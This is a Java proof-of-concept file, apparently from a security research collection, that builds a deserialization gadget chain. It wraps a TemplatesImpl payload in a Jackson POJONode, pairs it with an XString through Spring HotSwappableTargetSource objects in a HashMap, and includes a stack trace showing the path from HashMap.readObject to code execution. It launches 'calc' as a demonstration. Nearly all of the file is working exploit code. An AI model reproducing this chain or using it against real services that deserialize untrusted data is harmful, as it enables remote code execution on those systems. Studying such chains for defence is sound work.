package com.javasec.pocs.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.util.HashMap;

/**
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
 * serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
 * serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
 * defaultSerializeValue:1148, SerializerProvider (com.fasterxml.jackson.databind)
 * serialize:115, POJONode (com.fasterxml.jackson.databind.node)
 * _serializeNonRecursive:105, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
 * serialize:85, InternalNodeMapper$WrapperForSerializer (com.fasterxml.jackson.databind.node)
 * serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
 * _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
 * serialize:1572, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
 * _writeValueAndClose:1273, ObjectWriter (com.fasterxml.jackson.databind)
 * writeValueAsString:1140, ObjectWriter (com.fasterxml.jackson.databind)
 * nodeToString:34, InternalNodeMapper (com.fasterxml.jackson.databind.node)
 * toString:238, BaseJsonNode (com.fasterxml.jackson.databind.node)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * equals:104, HotSwappableTargetSource (org.springframework.aop.target)
 * putVal:634, HashMap (java.util)
 * readObject:1397, HashMap (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:21, XstringTemplateChain (com.javasec.pocs.jackson)
 */
public class XstringTemplateChain {
    public static void main(String[] args) throws Exception{
        SerializeUtils.OverideJackson();
        Templates templates = SerializeUtils.getTemplate("calc");
        POJONode jsonNodes = new POJONode(templates);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("123"));
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jsonNodes);
        // 执行序列化与反序列化，并且返回序列化数据
        HashMap<Object, Object> map = SerializeUtils.makeMap(h1, h2);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(map));
    }
}
